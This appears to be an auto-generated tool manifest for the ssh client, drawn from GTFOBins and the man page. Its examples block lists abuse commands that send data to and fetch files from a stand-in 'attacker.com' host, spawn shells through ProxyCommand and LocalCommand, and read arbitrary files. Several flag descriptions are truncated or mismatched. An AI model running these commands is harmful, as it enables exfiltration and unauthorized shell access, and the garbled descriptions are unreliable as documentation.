---
id: network-ssh-ssh
namespace: network:ssh:ssh
name: ssh
description: Secure Shell client; can execute remote commands, read/write files, transfer
  data, and spawn shells Can also download files, read arbitrary files, spawn an interactive
  shell, upload files.
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- system.file.read
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- ssh
parameters:

  - name: KL
    type: boolean
    required: false
    description: "port for re-"
    aliases:
      - "-KL"
      - "-KR"
  - name: flag-4
    type: string
    required: false
    default: null
    description: "Forces ssh to use IPv4 addresses only"
    aliases:
      - "-4"
  - name: flag-6
    type: string
    required: false
    default: null
    description: "Forces ssh to use IPv6 addresses only"
    aliases:
      - "-6"
  - name: flag-B
    type: string
    required: false
    default: null
    description: "Bind to the address of bind_interface before attempting to con- nect to the destination host. This is only useful on systems with more than one address"
    aliases:
      - "-B"
  - name: flag-D
    type: string
    required: false
    default: null
    description: "Specifies a local \"dynamic\" application-level port forwarding. This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address. Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server. Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file"
    aliases:
      - "-D"
  - name: flag-E
    type: string
    required: false
    default: null
    description: "Append debug logs to log_file instead of standard error"
    aliases:
      - "-E"
  - name: flag-F
    type: string
    required: false
    default: null
    description: "Specifies an alternative per-user configuration file. If a con- figuration file is given on the command line, the system-wide configuration file (/etc/ssh/ssh_config) will be ignored. The default for the per-user configuration file is ~/.ssh/config. If set to \"none\", no configuration files will be read"
    aliases:
      - "-F"
  - name: flag-I
    type: string
    required: false
    default: null
    description: "Specify the PKCS#11 shared library ssh should use to communicate with a PKCS#11 token providing keys for user authentication"
    aliases:
      - "-I"
  - name: flag-J
    type: string
    required: false
    default: null
    description: "Connect to the target host by first making an ssh connection to the jump host described by destination and then establishing a TCP forwarding to the ultimate destination from there. Multiple jump hops may be specified separated by comma characters. IPv6 addresses can be specified by enclosing the address in square brackets. This is a shortcut to specify a ProxyJump configura- tion directive. Note that configuration directives supplied on the command-line generally apply to the destination host and not any specified jump hosts. Use ~/.ssh/config to specify configu- ration for jump hosts"
    aliases:
      - "-J"
  - name: flag-K
    type: string
    required: false
    default: null
    description: "mote and -KD[bind_address:]port for dynamic port-forwardings. !command allows the user to execute a local command if the PermitLocalCommand option is enabled in ssh_config(5). Basic help is available, using the -h option"
    aliases:
      - "-K"
      - "-K"
  - name: flag-L
    type: string
    required: false
    default: null
    description: "-L [bind_address:]port:remote_socket -L local_socket:host:hostport -L local_socket:remote_socket Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side. This works by al- locating a socket to listen to either a TCP port on the local side, optionally bound to the specified bind_address, or to a Unix socket. Whenever a connection is made to the local port or socket, the connection is forwarded over the secure channel, and a connection is made to either host port hostport, or the Unix socket remote_socket, from the remote machine"
    aliases:
      - "-L"
  - name: flag-O
    type: string
    required: false
    default: null
    description: "Control an active connection multiplexing master process. When the -O option is specified, the ctl_cmd argument is interpreted and passed to the master process. Valid commands are: \"check\" (check that the master process is running), \"forward\" (request forwardings without command execution), \"cancel\" (cancel for- wardings), \"proxy\" (connect to a running multiplexing master in proxy mode), \"exit\" (request the master to exit), and \"stop\" (request the master to stop accepting further multiplexing re- quests)"
    aliases:
      - "-O"
  - name: flag-P
    type: string
    required: false
    default: null
    description: "ssh_config(5). Refer to the Tag and Match keywords in ssh_config(5) for more information. -p port Port to connect to on the remote host. This can be specified on a per-host basis in the configuration file"
    aliases:
      - "-P"
  - name: flag-Q
    type: string
    required: false
    default: null
    description: "Queries for the algorithms supported by one of the following features: cipher (supported symmetric ciphers), cipher-auth (supported symmetric ciphers that support authenticated encryp- tion), help (supported query terms for use with the -Q flag), mac (supported message integrity codes), kex (key exchange algo- rithms), kex-gss (GSSAPI key exchange algorithms), key (key types), key-ca-sign (valid CA signature algorithms for certifi- cates), key-cert (certificate key types), key-plain (non-cer- tificate key types), key-sig (all key types and signature algo- rithms), protocol-version (supported SSH protocol versions), and sig (supported signature algorithms). Alternatively, any key- word from ssh_config(5) or sshd_config(5) that takes an algo- rithm list may be used as an alias for the corresponding query_option"
    aliases:
      - "-Q"
  - name: flag-R
    type: string
    required: false
    default: null
    description: "-R [bind_address:]port:local_socket -R remote_socket:host:hostport -R remote_socket:local_socket -R [bind_address:]port Specifies that connections to the given TCP port or Unix socket on the remote (server) host are to be forwarded to the local side"
    aliases:
      - "-R"
  - name: flag-S
    type: string
    required: false
    default: null
    description: "Specifies the location of a control socket for connection shar- ing, or the string \"none\" to disable connection sharing. Refer to the description of ControlPath and ControlMaster in ssh_config(5) for details"
    aliases:
      - "-S"
  - name: flag-W
    type: string
    required: false
    default: null
    description: "Requests that standard input and output on the client be for- warded to host on port over the secure channel. Implies -N, -T, ExitOnForwardFailure and ClearAllForwardings, though these can be overridden in the configuration file or using -o command line options"
    aliases:
      - "-W"
  - name: flag-a
    type: string
    required: false
    default: null
    description: "Disables forwarding of the authentication agent connection"
    aliases:
      - "-a"
  - name: flag-b
    type: string
    required: false
    default: null
    description: "Use bind_address on the local machine as the source address of the connection. Only useful on systems with more than one ad- dress"
    aliases:
      - "-b"
  - name: flag-c
    type: array
    required: false
    default: null
    description: "Selects the cipher specification for encrypting the session. cipher_spec is a comma-separated list of ciphers listed in order of preference. See the Ciphers keyword in ssh_config(5) for more information"
    aliases:
      - "-c"
  - name: flag-e
    type: string
    required: false
    default: null
    description: "Sets the escape character for sessions with a pty . The escape character is only recognized at the beginning of a line. The escape character followed by a dot (`.') closes the connection; followed by control-Z suspends the connection; and followed by itself sends the escape character once. Setting the character to \"none\" disables any escapes and makes the ses- sion fully transparent"
    aliases:
      - "-e"
  - name: flag-f
    type: string
    required: false
    default: null
    description: "Requests ssh to go to background just before command execution"
    aliases:
      - "-f"
  - name: flag-g
    type: string
    required: false
    default: null
    description: "Allows remote hosts to connect to local forwarded ports. If"
    aliases:
      - "-g"
  - name: flag-i
    type: file
    required: false
    default: null
    description: "Selects a file from which the identity (private key) for public key authentication is read. You can also specify a public key file to use the corresponding private key that is loaded in ssh-agent(1) when the private key file is not present locally. The default is ~/.ssh/id_rsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ecdsa_sk, ~/.ssh/id_ed25519 and ~/.ssh/id_ed25519_sk. Identity files may also be specified on a per-host basis in the configuration file. It is possible to have multiple -i options (and multiple identities specified in configuration files). If no certificates have been explicitly specified by the CertificateFile directive, ssh will also try to load certificate information from the filename obtained by appending -cert.pub to identity filenames"
    aliases:
      - "-i"
  - name: flag-k
    type: string
    required: false
    default: null
    description: "Disables forwarding (delegation) of GSSAPI credentials to the"
    aliases:
      - "-k"
  - name: flag-l
    type: string
    required: false
    default: null
    description: "Specifies the user to log in as on the remote machine. This also may be specified on a per-host basis in the configuration file"
    aliases:
      - "-l"
  - name: flag-m
    type: array
    required: false
    default: null
    description: "A comma-separated list of MAC (message authentication code) al- gorithms, specified in order of preference. See the MACs key- word in ssh_config(5) for more information"
    aliases:
      - "-m"
  - name: flag-n
    type: string
    required: false
    default: null
    description: "Redirects stdin from /dev/null (actually, prevents reading from"
    aliases:
      - "-n"
  - name: flag-o
    type: string
    required: false
    default: null
    description: "Can be used to give options in the format used in the configura- tion file. This is useful for specifying options for which there is no separate command-line flag. For full details of the options listed below, and their possible values, see ssh_config(5)"
    aliases:
      - "-o"
  - name: flag-q
    type: string
    required: false
    default: null
    description: "Quiet mode. Causes most warning and diagnostic messages to be"
    aliases:
      - "-q"
  - name: flag-s
    type: string
    required: false
    default: null
    description: "May be used to request invocation of a subsystem on the remote"
    aliases:
      - "-s"
  - name: flag-t
    type: string
    required: false
    default: null
    description: "Force pseudo-terminal allocation. This can be used to execute"
    aliases:
      - "-t"
  - name: flag-t-2
    type: string
    required: false
    default: null
    description: ""
    aliases:
      - "-t"
  - name: flag-v
    type: string
    required: false
    default: null
    description: "Verbose mode. Causes ssh to print debugging messages about its"
    aliases:
      - "-v"
  - name: flag-w
    type: string
    required: false
    default: null
    description: "Requests tunnel device forwarding with the specified tun(4) de- vices between the client (local_tun) and the server (remote_tun)"
    aliases:
      - "-w"
  - name: flag-w-2
    type: string
    required: false
    default: null
    description: ""
    aliases:
      - "-w"
  - name: flag-x
    type: string
    required: false
    default: null
    description: "Disables X11 forwarding"
    aliases:
      - "-x"
  - name: flag-y
    type: string
    required: false
    default: null
    description: "Send log information using the syslog(3) system module. By de-"
    aliases:
      - "-y"

features:
- file-system
- interactive
- local
- network-intensive
- pipes-stdin
- process-manip
- remote
- requires-root
execution:
  template: ssh
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files
  command: ssh user@attacker.com 'cat /path/to/input-file"
- description: Read arbitrary files
  command: ssh -F /path/to/input-file x
- description: Spawn an interactive shell
  command: ssh localhost /bin/sh
- description: Spawn an interactive shell
  command: ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
- description: Spawn an interactive shell
  command: ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
- description: Upload files
  command: echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/ssh/
techniques:
- collection
- privilege-escalation
- execution
- exfiltration
install:
- method: apt
  package_name: openssh-client
  commands:
  - apt-get install -y openssh-client
---

# ssh

ssh is a command-line utility. Secure Shell client; can execute remote commands, read/write files, transfer data, and spawn shells Can also download files, read arbitrary files, spawn an interactive shell, upload files.
